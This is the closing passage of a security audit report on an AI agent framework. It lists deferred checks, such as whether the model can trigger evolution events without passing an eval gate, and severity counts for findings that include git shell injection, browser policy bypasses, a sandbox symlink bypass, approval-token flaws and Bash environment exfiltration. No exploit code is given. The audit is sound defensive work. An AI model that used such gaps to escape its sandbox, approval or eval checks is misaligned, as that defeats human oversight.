- **Plugin runner inits and panic safety.** The loader handles `PluginError`, but if a plugin's `initialize()` `panic!`s it would unwind into the bootstrap path. Spot check of `crates/wcore-agent/src/plugins/runner.rs` deferred.
- **Hook execution audit.** I read the front-matter / skill-loader edge of hooks but didn't trace the actual hook-runner for env-var passing, working-dir, and tool-event scope. Likely worth a separate pass.
- **`agents_md::resolve_include_path` (referenced at `crates/wcore-agent/src/agents_md.rs:135`).** AGENTS.md / CLAUDE.md include-resolution could be an arbitrary-read vector via crafted `@include` directives; not audited.
- **Eval-gate identity (gepa_enabled).** Per the prompt: "Can `gepa_enabled` be flipped by config without the eval-gate actually being passed?" The capability flag is part of `Capabilities` (`crates/wcore-protocol/src/events.rs:396`) and serialized to the Ready event. Setting it true ADVERTISES the surface; the actual GEPA loop in `wcore-evolve` is invoked by the agent when it runs evolution. Whether the LLM can trigger `evolution_event` emission without actually having passed an eval gate — depends on agent-engine wiring not audited here. The W10B golden test `golden_capabilities_with_gepa_enabled_on_serializes_the_key` confirms the wire shape but not the gating semantics. File-marked for a deeper audit when GEPA actually ships.
- **BrowserPolicy + DNS rebinding.** Not probed in this pass. Modern: the policy resolves host strings textually, doesn't pin DNS, doesn't enforce TLS server cert hostname binding. Browser backends typically protect against rebinding via their own CONNECT/site-isolation logic but I didn't verify.

---

## Summary counts

- **BLOCKER:** 3 (Git shell injection; shell helper API forces shell-string mode; Browser policy not re-checked on redirect)
- **MAJOR:** 16 (Browser scheme bypass, IPv6/IPv4-mapped bypass, octal/hex IP bypass, IDN homograph, CuaPolicy mark-app-seen unwired, Default vs serde-default mismatch, key-combo trivial-bypass, Type bypasses key gate, ApprovalBridge token authorization, SandboxedFs symlink bypass, legacy `execute()` no sandbox, plugin capability name-spoofing, plaintext API key permissions, FileHistory non-crypto digest, no token expiry, Bash env exfil)
- **MINOR:** 4 (IP-literal not on suffix-glob deny; MCP transport blank-line DoS; Script ALLOW_LIST includes Bash; hook registration provenance)
- **INFORMATIONAL:** 3 (cargo-audit spot check, validate_memory_path not invoked from tools, P5 manifest re-validation)

The three BLOCKERs are the most urgent. BLOCKER #1 and #2 are a paired root cause/symptom — fix the helper API and migrate GitTool together. BLOCKER #3 requires backend-level request interception which depends on the (still-pending) wayland-browser backend wiring — capture it as a hard gate before any of the W8c.1.B/W8c.1.C work merges.
